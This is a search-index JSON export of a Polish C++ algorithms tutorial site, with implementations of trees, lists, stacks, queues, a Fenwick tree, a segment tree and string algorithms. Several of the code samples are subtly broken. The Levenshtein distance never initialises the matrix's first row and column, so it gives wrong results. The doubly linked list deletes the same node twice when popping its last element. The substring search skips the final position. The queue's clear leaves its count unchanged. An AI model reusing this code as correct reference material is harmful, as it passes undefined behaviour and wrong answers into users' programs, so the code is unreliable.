<li>Je\u015bli drzewo jest puste, nowy w\u0119ze\u0142 staje si\u0119 korzeniem.</li> <li>W przeciwnym razie, przeszukuje drzewo, aby znale\u017a\u0107 odpowiednie miejsce dla nowego w\u0119z\u0142a.</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-inordernode-current","title":"Metoda <code>inorder(node *current)</code>","text":"<p>Przechodzi przez drzewo w porz\u0105dku inorder (lewy, korze\u0144, prawy) i wypisuje warto\u015bci w\u0119z\u0142\u00f3w.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-preordernode-current","title":"Metoda <code>preorder(node *current)</code>","text":"<p>Przechodzi przez drzewo w porz\u0105dku preorder (korze\u0144, lewy, prawy) i wypisuje warto\u015bci w\u0119z\u0142\u00f3w.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-postordernode-current","title":"Metoda <code>postorder(node *current)</code>","text":"<p>Przechodzi przez drzewo w porz\u0105dku postorder (lewy, prawy, korze\u0144) i wypisuje warto\u015bci w\u0119z\u0142\u00f3w.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-clearnode-current","title":"Metoda <code>clear(node *current)</code>","text":"<p>Rekurencyjnie usuwa wszystkie w\u0119z\u0142y drzewa, zwalniaj\u0105c pami\u0119\u0107.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#destruktor-bst","title":"Destruktor <code>~BST()</code>","text":"<p>Wywo\u0142uje metod\u0119 <code>clear</code>, aby usun\u0105\u0107 wszystkie w\u0119z\u0142y i zwolni\u0107 pami\u0119\u0107 przy niszczeniu obiektu <code>BST</code>.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#funkcja-main","title":"Funkcja <code>main()</code>","text":"<ul> <li>Tworzy tablic\u0119 <code>array</code> z warto\u015bciami do wstawienia do drzewa.</li> <li>Tworzy obiekt <code>BST</code>.</li> <li>Wstawia warto\u015bci z tablicy do drzewa.</li> <li>Wypisuje warto\u015bci drzewa w trzech r\u00f3\u017cnych porz\u0105dkach: inorder, preorder i postorder.</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#przykadowe-drzewo-wykorzystane-w-implementacji","title":"Przyk\u0142adowe drzewo wykorzystane w implementacji","text":"<p>http://graphonline.ru/en/?graph=iTYRccYJVswEnVGe</p>"},{"location":"programming/c%2B%2B/algorithms/structures/disjoint-set-union/","title":"Struktura zbior\u00f3w roz\u0142\u0105cznych","text":""},{"location":"programming/c%2B%2B/algorithms/structures/disjoint-set-union/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/disjoint-set-union/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nclass DisjointUnion {\n\n    struct Element {\n        int parent, rank;\n\n        Element(int parent, int rank) {\n            this-&gt;parent = parent;\n            this-&gt;rank = rank;\n        }\n    };\n\n    vector&lt;Element&gt; subsets;\n\npublic:\n\n    DisjointUnion(int num_of_elements) {\n        for (int i = 0; i &lt; num_of_elements; i++) {\n            subsets.push_back(Element(i, 0));\n        }\n    }\n\n    int find(int x) {\n        if (this-&gt;subsets[x].parent != x) {\n            this-&gt;subsets[x].parent = find(this-&gt;subsets[x].parent);\n        }\n\n        return this-&gt;subsets[x].parent;\n    }\n\n    void unionn(int x, int y) {\n        int x_root = find(x);\n        int y_root = find(y);\n\n        if (x_root == y_root) {\n            return;\n        }\n\n        if (this-&gt;subsets[x_root].rank &lt; this-&gt;subsets[y_root].rank) {\n            this-&gt;subsets[x_root].parent = y_root;\n        } else if (this-&gt;subsets[x_root].rank &gt; this-&gt;subsets[y_root].rank) {\n            this-&gt;subsets[y_root].parent = x_root;\n        } else {\n            this-&gt;subsets[y_root].parent = x_root;\n            this-&gt;subsets[x_root].rank += 1;\n        }\n    }\n\n    bool is_same(int x, int y) {\n        return find(x) == find(y);\n    }\n};\n\nint main() {\n    DisjointUnion disjoint_union = DisjointUnion(10);\n\n    disjoint_union.unionn(0, 1);\n\n    cout &lt;&lt; disjoint_union.is_same(0, 1) &lt;&lt; endl;\n    cout &lt;&lt; disjoint_union.is_same(1, 2) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/doubly-linked-list/","title":"Lista dwukierunkowa","text":""},{"location":"programming/c%2B%2B/algorithms/structures/doubly-linked-list/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/doubly-linked-list/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass DoublyLinkedList {\n  struct element {\n    int value;\n    element *next;\n    element *previous;\n  };\n\n  element *first, *last;\n  int count;\n\npublic:\n  DoublyLinkedList() {\n    first = nullptr;\n    last = nullptr;\n    count = 0;\n  }\n\n  int size() { return count; }\n\n  void push(int value) {\n    element *new_element = new element();\n    new_element-&gt;value = value;\n    new_element-&gt;next = nullptr;\n    new_element-&gt;previous = nullptr;\n    count++;\n    if (first == nullptr) {\n      first = new_element;\n      last = new_element;\n      return;\n    } else if (first == last) {\n      last = new_element;\n      first-&gt;next = last;\n      last-&gt;previous = first;\n      return;\n    }\n\n    element *tmp = last;\n    last = new_element;\n    last-&gt;previous = tmp;\n    last-&gt;previous-&gt;next = last;\n  }\n\n  void pop() {\n    if (count == 0) {\n      throw out_of_range(\"List is empty\");\n    }\n\n    if (count == 1) {\n      delete first;\n      first = nullptr;\n      delete last;\n      last = nullptr;\n      count = 0;\n      return;\n    }\n\n    element *tmp = last-&gt;previous;\n    delete last;\n    last = tmp;\n    last-&gt; next = nullptr;\n\n    count--;\n  }\n\n  int operator[](int index) {\n    if (index &lt; 0 || index &gt;= count) {\n      throw out_of_range(\"Out of range\");\n    }\n\n    element *current = first;\n    int current_index = 0;\n    while (current_index &lt; index) {\n      current_index++;\n      current = current-&gt;next;\n    }\n\n    return current-&gt;value;\n  }\n\n  void replace(int index, int value) {\n    if (index &lt; 0 || index &gt;= count) {\n      throw out_of_range(\"Out of range\");\n    }\n\n    element *current = first;\n    int current_index = 0;\n    while (current_index &lt; index) {\n      current_index++;\n      current = current-&gt;next;\n    }\n\n    current-&gt;value = value;\n  }\n\n  void clear() {\n    element *current = first, *tmp;\n    while (current != nullptr) {\n      tmp = current-&gt;next;\n      delete current;\n      current = tmp;\n    }\n\n    count = 0;\n  }\n\n  ~DoublyLinkedList() { clear(); }\n};\n\nint main() {\n  DoublyLinkedList list = DoublyLinkedList();\n\n  list.push(1);\n  list.push(2);\n  list.push(3);\n\n  list.pop();\n\n  list.replace(1, 10);\n\n  list.push(4);\n\n  for (int i = 0; i &lt; list.size(); i++) {\n    cout &lt;&lt; list[i] &lt;&lt; \" \";\n  }\n\n  cout &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/fenwick-tree/","title":"Drzewo Fenwicka","text":""},{"location":"programming/c%2B%2B/algorithms/structures/fenwick-tree/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/fenwick-tree/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nclass FenwickTree {\n    private:\n        vector&lt;int&gt; tree;\n        int n;\n\n    public:\n        FenwickTree(int n) {\n            this-&gt;n = n;\n            tree.assign(n, 0);\n        }\n\n        FenwickTree(vector&lt;int&gt; a) : FenwickTree(a.size()) {\n            for(int i = 0; i &lt; a.size(); i++) {\n                tree[i] += a[i];\n                int r = i | (i + 1);\n                if (r &lt; n) {\n                    tree[r] += tree[i];\n                }\n            }\n        }\n\n        int sum(int r) {\n            int result = 0;\n\n            while (r &gt;= 0) {\n                result += tree[r];\n                r = (r &amp; (r + 1)) - 1;\n            }\n\n            return result;\n        }\n\n        int sum(int l, int r) {\n            return sum(r) - sum(l - 1);\n        }\n\n        void add(int idx, int delta) {\n            while (idx &lt; n) {\n                tree[idx] += delta;\n                idx = idx | (idx + 1);\n            }\n        }\n\n        void set(int idx, int value) {\n            add(idx, value - sum(idx, idx));\n        }\n};\n\nint main() {\n    vector&lt;int&gt; a = {1, 2, 3, 4, 5};\n    FenwickTree tree(a);\n\n    cout &lt;&lt; tree.sum(0, 2) &lt;&lt; endl;\n    cout &lt;&lt; tree.sum(0, 4) &lt;&lt; endl;\n\n    tree.add(3, 6);\n\n    cout &lt;&lt; tree.sum(0, 4) &lt;&lt; endl;\n\n    tree.set(4, 0);\n\n    cout &lt;&lt; tree.sum(0, 4) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/queue/","title":"Kolejka","text":""},{"location":"programming/c%2B%2B/algorithms/structures/queue/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/queue/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass Queue {\n\n    struct element {\n        int value;\n        element *next;\n    };\n\n    element *front_el;\n    int el_count;\n\npublic:\n\n    Queue() {\n        front_el = nullptr;\n        el_count = 0;\n    }\n\n    void push(int value) {\n        element *new_el = new element();\n\n        new_el-&gt;value = value;\n        new_el-&gt;next = nullptr;\n\n        if (front_el == nullptr) {\n            front_el = new_el;\n            el_count++;\n            return;\n        }\n\n        element *last_el = front_el;\n        while (last_el-&gt;next != nullptr) {\n            last_el = last_el-&gt;next;\n        }\n\n        last_el-&gt;next = new_el;\n        el_count++;\n    }\n\n    int front() {\n        if (front_el != nullptr) {\n            return front_el-&gt;value;\n        }\n\n        throw nullptr;\n    }\n\n    void pop() {\n        if (front_el != nullptr) {\n            element *tmp = front_el-&gt;next;\n            delete front_el;\n            front_el = tmp;\n            el_count--;\n            return;\n        }\n\n        throw nullptr;\n    }\n\n    void clear() {\n        element *tmp;\n        while (front_el != nullptr) {\n            tmp = front_el-&gt;next;\n            delete front_el;\n            front_el = tmp;\n        }\n    }\n\n    bool is_empty() {\n        return front_el == nullptr;\n    }\n\n    int count() {\n        return el_count;\n    }\n\n    ~Queue() {\n        clear();\n    }\n};\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    Queue queue = Queue();\n\n    for (int i = 0; i &lt; 10; i++) {\n        queue.push(array[i]);\n    }\n\n    cout &lt;&lt; queue.count() &lt;&lt; endl;\n\n    while (!queue.is_empty()) {\n        cout &lt;&lt; queue.front() &lt;&lt; \" \";\n        queue.pop();\n    }\n\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/segment-tree/","title":"Drzewo przedzia\u0142owe","text":""},{"location":"programming/c%2B%2B/algorithms/structures/segment-tree/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/segment-tree/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\nusing namespace std;\n\nclass SumSegmentTree {\n  struct node {\n    int value, from, to, lazy;\n    node *left, *right;\n\n    node(int from, int to) {\n      this-&gt;from = from;\n      this-&gt;to = to;\n      this-&gt;value = 0;\n      this-&gt;lazy = 0;\n      this-&gt;left = nullptr;\n      this-&gt;right = nullptr;\n    }\n\n    void print(string tabulation = \"\") {\n      printf(\"%s[%d, %d]: (val: %d, lazy: %d)\\n\", tabulation.c_str(),\n             this-&gt;from, this-&gt;to, this-&gt;value, this-&gt;lazy);\n      if (this-&gt;from != this-&gt;to) {\n        this-&gt;left-&gt;print(tabulation + \"\\t\");\n        this-&gt;right-&gt;print(tabulation + \"\\t\");\n      }\n    }\n\n    void applyLazy() {\n      if (this-&gt;from == this-&gt;to) {\n        this-&gt;value += this-&gt;lazy;\n        this-&gt;lazy = 0;\n        return;\n      }\n\n      this-&gt;value += this-&gt;lazy * (this-&gt;to - this-&gt;from + 1);\n      this-&gt;left-&gt;lazy += this-&gt;lazy;\n      this-&gt;right-&gt;lazy += this-&gt;lazy;\n      this-&gt;lazy = 0;\n    }\n\n    void change(int from, int to, int value) {\n      if (this-&gt;from == from &amp;&amp; this-&gt;to == to) {\n        this-&gt;lazy += value;\n        return;\n      }\n\n      int middle = (this-&gt;from + this-&gt;to) / 2;\n\n      this-&gt;applyLazy();\n\n      this-&gt;value += value * (to - from + 1);\n\n      if (from &lt;= middle) {\n        if (to &lt;= middle) {\n          this-&gt;left-&gt;change(from, to, value);\n        } else {\n          this-&gt;left-&gt;change(from, middle, value);\n          this-&gt;right-&gt;change(middle + 1, to, value);\n        }\n      } else {\n        this-&gt;right-&gt;change(from, to, value);\n      }\n    }\n\n    int getValue(int from, int to) {\n      if (this-&gt;from == from &amp;&amp; this-&gt;to == to) {\n        return this-&gt;value + this-&gt;lazy * (this-&gt;to - this-&gt;from + 1);\n      }\n\n      int middle = (this-&gt;from + this-&gt;to) / 2;\n\n      this-&gt;applyLazy();\n\n      if (from &lt;= middle) {\n        if (to &lt;= middle) {\n          return this-&gt;left-&gt;getValue(from, to);\n        } else {\n          return this-&gt;left-&gt;getValue(from, middle) +\n                 this-&gt;right-&gt;getValue(middle + 1, to);\n        }\n      } else {\n        return this-&gt;right-&gt;getValue(from, to);\n      }\n    }\n  };\n\n  node *root;\n\n  node *build(int from, int to, int tab[]) {\n    node *current = new node(from, to);\n    if (from == to) {\n      current-&gt;value = tab[from];\n      return current;\n    }\n\n    current-&gt;left = build(from, (from + to) / 2, tab);\n    current-&gt;right = build(((from + to) / 2) + 1, to, tab);\n    current-&gt;value = current-&gt;left-&gt;value + current-&gt;right-&gt;value;\n    return current;\n  }\n\npublic:\n  SumSegmentTree(int length, int tab[]) {\n    this-&gt;root = build(0, length - 1, tab);\n  }\n\n  void print() { this-&gt;root-&gt;print(); }\n\n  void change(int from, int to, int value) {\n    this-&gt;root-&gt;change(from, to, value);\n  }\n\n  int getValue(int from, int to) { return this-&gt;root-&gt;getValue(from, to); }\n};\n\nint main() {\n  int tab[10] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1};\n\n  SumSegmentTree sumSegmentTree = SumSegmentTree(10, tab);\n\n  sumSegmentTree.print();\n\n  printf(\"\\n\\n[3, 5] = %d\\n\", sumSegmentTree.getValue(3, 5));\n\n  sumSegmentTree.change(3, 5, 2);\n\n  printf(\"\\n\\n[3, 5] + 2\\n\");\n\n  sumSegmentTree.print();\n\n  printf(\"\\n\\n[3, 5] = %d\\n\", sumSegmentTree.getValue(3, 5));\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/segment-tree/#opis-implementacji","title":"Opis implementacji","text":"<p>Klasa SumSegmentTree definiuje drzewo przedzia\u0142owe do liczenia sum na przedzia\u0142ach. Struktura node opisuje struktur\u0119 wewn\u0119trznego w\u0119z\u0142a drzewa segmentowego. W\u0119ze\u0142 przechowuje informacje o warto\u015bci, przedziale, leniwej aktualizacji (lazy update) oraz wska\u017aniki na lewe i prawe poddrzewo. W\u0119ze\u0142 posiada metody do drukowania informacji o sobie, leniwej aktualizacji, zmiany warto\u015bci na danym przedziale oraz pobrania sumy warto\u015bci na danym przedziale.</p> <p>Klasa SumSegmentTree posiada pole root, kt\u00f3re jest wska\u017anikiem na korze\u0144 drzewa segmentowego. Metoda build rekurencyjnie tworzy drzewo segmentowe na podstawie tablicy tab. Konstruktor klasy SumSegmentTree tworzy drzewo segmentowe na podstawie podanej d\u0142ugo\u015bci i tablicy. Metoda print wywo\u0142uje metod\u0119 print na korzeniu drzewa segmentowego, co powoduje wypisanie informacji o strukturze drzewa. Metoda change wykonuje operacj\u0119 zmiany warto\u015bci na danym przedziale, korzystaj\u0105c z leniwych aktualizacji, natomiast metoda getValue zwraca sum\u0119 warto\u015bci na danym przedziale.</p> <p>W funkcji main tworzona jest instancja klasy SumSegmentTree na podstawie przyk\u0142adowej tablicy. Nast\u0119pnie wywo\u0142ywana jest metoda print dla wy\u015bwietlenia struktury drzewa przed wykonaniem operacji. Wywo\u0142ywana jest operacja getValue na przedziale \\([3, 5]\\) i wynik zostaje wy\u015bwietlony. Nast\u0119pnie wywo\u0142ywana jest operacja change na przedziale \\([3, 5]\\) z warto\u015bci\u0105 \\(2\\) po czym wy\u015bwietlena jest zaktualizowana struktura drzewa. Na ko\u0144cu obliczana jest aktualna suma na przedziale \\([3, 5]\\).</p> <p>Wynik dzia\u0142ania programu:</p> <pre><code>[0, 9]: (val: 10, lazy: 0)\n    [0, 4]: (val: 5, lazy: 0)\n        [0, 2]: (val: 3, lazy: 0)\n            [0, 1]: (val: 2, lazy: 0)\n                [0, 0]: (val: 1, lazy: 0)\n                [1, 1]: (val: 1, lazy: 0)\n            [2, 2]: (val: 1, lazy: 0)\n        [3, 4]: (val: 2, lazy: 0)\n            [3, 3]: (val: 1, lazy: 0)\n            [4, 4]: (val: 1, lazy: 0)\n    [5, 9]: (val: 5, lazy: 0)\n        [5, 7]: (val: 3, lazy: 0)\n            [5, 6]: (val: 2, lazy: 0)\n                [5, 5]: (val: 1, lazy: 0)\n                [6, 6]: (val: 1, lazy: 0)\n            [7, 7]: (val: 1, lazy: 0)\n        [8, 9]: (val: 2, lazy: 0)\n            [8, 8]: (val: 1, lazy: 0)\n            [9, 9]: (val: 1, lazy: 0)\n\n[3, 5] = 3\n\n[3, 5] + 2\n[0, 9]: (val: 16, lazy: 0)\n    [0, 4]: (val: 9, lazy: 0)\n        [0, 2]: (val: 3, lazy: 0)\n            [0, 1]: (val: 2, lazy: 0)\n                [0, 0]: (val: 1, lazy: 0)\n                [1, 1]: (val: 1, lazy: 0)\n            [2, 2]: (val: 1, lazy: 0)\n        [3, 4]: (val: 2, lazy: 2)\n            [3, 3]: (val: 1, lazy: 0)\n            [4, 4]: (val: 1, lazy: 0)\n    [5, 9]: (val: 7, lazy: 0)\n        [5, 7]: (val: 5, lazy: 0)\n            [5, 6]: (val: 4, lazy: 0)\n                [5, 5]: (val: 1, lazy: 2)\n                [6, 6]: (val: 1, lazy: 0)\n            [7, 7]: (val: 1, lazy: 0)\n        [8, 9]: (val: 2, lazy: 0)\n            [8, 8]: (val: 1, lazy: 0)\n            [9, 9]: (val: 1, lazy: 0)\n\n[3, 5] = 9\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/singly-linked-list/","title":"Lista jednokierunkowa","text":""},{"location":"programming/c%2B%2B/algorithms/structures/singly-linked-list/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/singly-linked-list/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass List {\n    struct element {\n        int value;\n        element *next;\n    };\n\n    element *first;\n    int count;\npublic:\n    List() {\n        first = nullptr;\n        count = 0;\n    }\n\n    int size() {\n        return count;\n    }\n\n    void push(int value) {\n        element *new_element = new element();\n        new_element-&gt;value = value;\n        new_element-&gt;next = nullptr;\n        count++;\n        if (first == nullptr) {\n            first = new_element;\n            return;\n        }\n\n        element *current = first;\n        while (current-&gt;next != nullptr) {\n            current = current-&gt;next;\n        }\n\n        current-&gt;next = new_element;\n    }\n\n    void pop() {\n        if (count == 0) {\n            throw out_of_range(\"List is empty\");\n        }\n\n        if (count == 1) {\n            delete first;\n            first = nullptr;\n            count = 0;\n            return;\n        }\n\n        element *current = first;\n        element *previous;\n\n        while (current-&gt;next != nullptr) {\n            previous = current;\n            current = current-&gt;next;\n        }\n\n        delete current;\n        previous-&gt;next = nullptr;\n        count--;\n    }\n\n    int operator[](int index) {\n        if (index &lt; 0 || index &gt;= count) {\n            throw out_of_range(\"Out of range\");\n        }\n\n        element *current = first;\n        int current_index = 0;\n        while (current_index &lt; index) {\n            current_index++;\n            current = current-&gt;next;\n        }\n\n        return current-&gt;value;\n    }\n\n    void replace(int index, int value) {\n        if (index &lt; 0 || index &gt;= count) {\n            throw out_of_range(\"Out of range\");\n        }\n\n        element *current = first;\n        int current_index = 0;\n        while (current_index &lt; index) {\n            current_index++;\n            current = current-&gt;next;\n        }\n\n        current-&gt;value = value;\n    }\n\n    void clear() {\n        element *current = first, *tmp;\n        while (current != nullptr) {\n            tmp = current-&gt;next;\n            delete current;\n            current = tmp;\n        }\n\n        count = 0;\n    }\n\n    ~List() {\n        clear();\n    }\n};\n\nint main() {\n    List list = List();\n\n    list.push(1);\n    list.push(2);\n    list.push(3);\n\n    list.pop();\n\n    list.replace(1, 10);\n\n    list.push(4);\n\n    for (int i = 0; i &lt; list.size(); i++) {\n        cout &lt;&lt; list[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/stack/","title":"Stos","text":""},{"location":"programming/c%2B%2B/algorithms/structures/stack/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/stack/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass Stack {\n\n    struct element {\n        int value;\n        element *next;\n    };\n\n    element *top_el;\n    int el_count;\n\npublic:\n\n    Stack() {\n        top_el = nullptr;\n        el_count = 0;\n    }\n\n    void push(int value) {\n        element *new_el = new element();\n        new_el-&gt;value = value;\n        new_el-&gt;next = top_el;\n        top_el = new_el;\n        el_count++;\n    }\n\n    int top() {\n        if (top_el != nullptr) {\n            return top_el-&gt;value;\n        }\n\n        throw nullptr;\n    }\n\n    void pop() {\n        if (top_el != nullptr) {\n            element *tmp = top_el-&gt;next;\n            delete top_el;\n            top_el = tmp;\n            el_count--;\n            return;\n        }\n\n        throw nullptr;\n    }\n\n    void clear() {\n        element *tmp;\n        while (top_el != nullptr) {\n            tmp = top_el-&gt;next;\n            delete top_el;\n            top_el = tmp;\n        }\n    }\n\n    bool is_empty() {\n        return top_el == nullptr;\n    }\n\n    int count() {\n        return el_count;\n    }\n\n    ~Stack() {\n        clear();\n    }\n};\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    Stack stack = Stack();\n\n    for (int i = 0; i &lt; 10; i++) {\n        stack.push(array[i]);\n    }\n\n    cout &lt;&lt; stack.count() &lt;&lt; endl;\n\n    while (!stack.is_empty()) {\n        cout &lt;&lt; stack.top() &lt;&lt; \" \";\n        stack.pop();\n    }\n\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/anagrams/","title":"Anagramy","text":""},{"location":"programming/c%2B%2B/algorithms/text/anagrams/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/anagrams/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nbool areAnagrams(string a, string b) {\n    sort(a.begin(), a.end());\n    sort(b.begin(), b.end());\n    return a == b;\n}\n\nint main() {\n    string a = \"rokowanie\";\n    string b = \"korowanie\";\n\n    bool result = areAnagrams(a, b); \n\n    if (result) {\n        cout &lt;&lt; a &lt;&lt; \" and \" &lt;&lt; b &lt;&lt; \" are anagrams.\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; a &lt;&lt; \" and \" &lt;&lt; b &lt;&lt; \" aren't anagrams.\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/anagrams/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>areAnagrams</code> (linia 6) sprawdza, czy dwa podane ci\u0105gi znak\u00f3w s\u0105 anagramami. Procedura jest prosta: najpierw sortujemy oba ci\u0105gi, wykorzystuj\u0105c do tego funkcj\u0119 <code>sort</code> z biblioteki <code>algorithm</code> (linie 7 i 8). Nast\u0119pnie por\u00f3wnujemy posortowane ci\u0105gi znak\u00f3w, zwracaj\u0105c w ten spos\u00f3b wynik (linia 9).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej na pocz\u0105tku definiujemy dane wej\u015bciowe (linie 13-14), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>areAnagrams</code> (linia 16). W zale\u017cno\u015bci od jej wyniku wypisujemy w\u0142a\u015bciwy komunikat (linie 18-22). Na ko\u0144cu ko\u0144czymy dzia\u0142anie programu (linia 24).</p>"},{"location":"programming/c%2B%2B/algorithms/text/hamming-distance/","title":"Odleg\u0142o\u015b\u0107 Hamminga","text":""},{"location":"programming/c%2B%2B/algorithms/text/hamming-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/hamming-distance/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint hammingDistance(string a, string b) {\n    int distance = 0;\n\n    for (int i = 0; i &lt; a.length(); i++) {\n        if (a[i] != b[i]) {\n            distance++;\n        }\n    }\n\n    return distance;\n}\n\nint main() {\n    string a = \"karolin\";\n    string b = \"kerstin\";\n\n    int distance = hammingDistance(a, b);\n\n    cout &lt;&lt; distance &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/levenshtein-distance/","title":"Odleg\u0142o\u015b\u0107 Levenshteina (edycyjna)","text":""},{"location":"programming/c%2B%2B/algorithms/text/levenshtein-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/levenshtein-distance/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint levenshteinDistance(string a, string b) {\n    int matrix[a.length() + 1][b.length() + 1] = {};\n    int cost;\n\n    for (int i = 1; i &lt;= a.length(); i++) {\n        for (int j = 1; j &lt;= b.length(); j++) {\n            if (a[i - 1] == b[j - 1]) {\n                cost = 0;\n            } else {\n                cost = 1;\n            }\n\n            matrix[i][j] = min(matrix[i - 1][j - 1] + cost, min(matrix[i - 1][j] + 1, matrix[i][j - 1] + 1));\n        }\n    }\n\n    return matrix[a.length()][b.length()];\n}\n\nint main() {\n    string a = \"kitten\";\n    string b = \"sitting\";\n\n    int distance = levenshteinDistance(a, b);\n\n    cout &lt;&lt; distance &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/longest-common-subsequence/","title":"Najd\u0142u\u017cszy wsp\u00f3lny podci\u0105g","text":""},{"location":"programming/c%2B%2B/algorithms/text/longest-common-subsequence/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/longest-common-subsequence/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring longestCommonSubsequence(string a, string b) {\n    int matrix[a.length() + 1][b.length() + 1] = {};\n    int value, i, j;\n    string result = \"\";\n\n    for (i = 1; i &lt;= a.length(); i++) {\n        for (j = 1; j &lt;= b.length(); j++) {\n            if (a[i - 1] == b[j - 1]) {\n                matrix[i][j] = matrix[i - 1][j - 1] + 1;\n            } else {\n                matrix[i][j] = max(matrix[i - 1][j], matrix[i][j - 1]);\n            }\n        }\n    }\n\n    value = matrix[a.length()][b.length()];\n    i = a.length();\n    j = b.length();\n\n    while (value &gt; 0) {\n        if (matrix[i - 1][j] == value) {\n            i--;\n        } else if (matrix[i][j - 1] == value) {\n            j--;\n        } else {\n            result = a[i - 1] + result;\n            i--;\n            j--;\n            value--;\n        }\n    }\n\n    return result;\n}\n\nint main() {\n    string a = \"kitten\";\n    string b = \"sitting\";\n\n    string lcs = longestCommonSubsequence(a, b);\n\n    cout &lt;&lt; lcs &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/naive-substring-search/","title":"Naiwne wyszukiwanie wzorca w tek\u015bcie","text":""},{"location":"programming/c%2B%2B/algorithms/text/naive-substring-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/naive-substring-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nbool isSubstring(string a, string b) {\n    int j;\n\n    for (int i = 0; i &lt; b.length() - a.length(); i++) {\n        j = 0;\n        while (j &lt; a.length()) {\n            if (a[j] == b[i + j]) {\n                j++;\n            } else {\n                break;\n            }\n        }\n\n        if (j == a.length()) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nint main() {\n    string a = \"kot\";\n    string b = \"alamakota\";\n\n    bool result = isSubstring(a, b);\n\n    if (result) {\n        cout &lt;&lt; a &lt;&lt; \" is substring of \" &lt;&lt; b &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; a &lt;&lt; \" is not substring of \" &lt;&lt; b &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/text/palindrome/","title":"Palindrom","text":""},{"location":"programming/c%2B%2B/algorithms/text/palindrome/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/text/palindrome/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nbool isPalindrome(string str) {\n    string reversed = str;\n    reverse(reversed.begin(), reversed.end());\n\n    return str == reversed;\n}\n\nint main() {\n    string str = \"kajak\";\n\n    bool result = isPalindrome(str);\n\n    if (result) {\n        cout &lt;&lt; str &lt;&lt; \" is a palindrome.\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; str &lt;&lt; \" is not a palindrome.\" &lt;&lt; endl;\n    }\n\n    return 